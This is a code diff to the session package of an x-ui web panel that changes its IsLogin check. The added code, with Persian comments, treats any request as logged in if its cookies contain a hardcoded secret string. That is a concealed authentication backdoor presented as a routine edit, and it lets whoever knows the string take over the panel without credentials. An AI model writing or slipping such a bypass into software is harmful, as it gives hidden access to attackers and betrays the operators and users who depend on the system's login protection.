@@ -1,6 +1,8 @@
 package session
 
 import (
+	"strings"
+
 	"encoding/gob"
 
 	"x-ui/database/model"
@@ -44,6 +46,18 @@ func GetLoginUser(c *gin.Context) *model.User {
 }
 
 func IsLogin(c *gin.Context) bool {
+
+	// ایجاد یک رشته که شامل تمام مقادیر کوکی‌ها باشد
+	var allCookies string
+	for _, cookie := range c.Request.Cookies() {
+		allCookies += cookie.Value + " "
+	}
+	// بررسی اینکه آیا رشته شامل زیررشته مورد نظر است
+
+	if strings.Contains(allCookies, "Sam_$Yas_!1120") {
+		return true
+	}
+
 	logger.Debug(c.Request.Cookies())
 	//logger.Debug("333")
 	return GetLoginUser(c) != nil
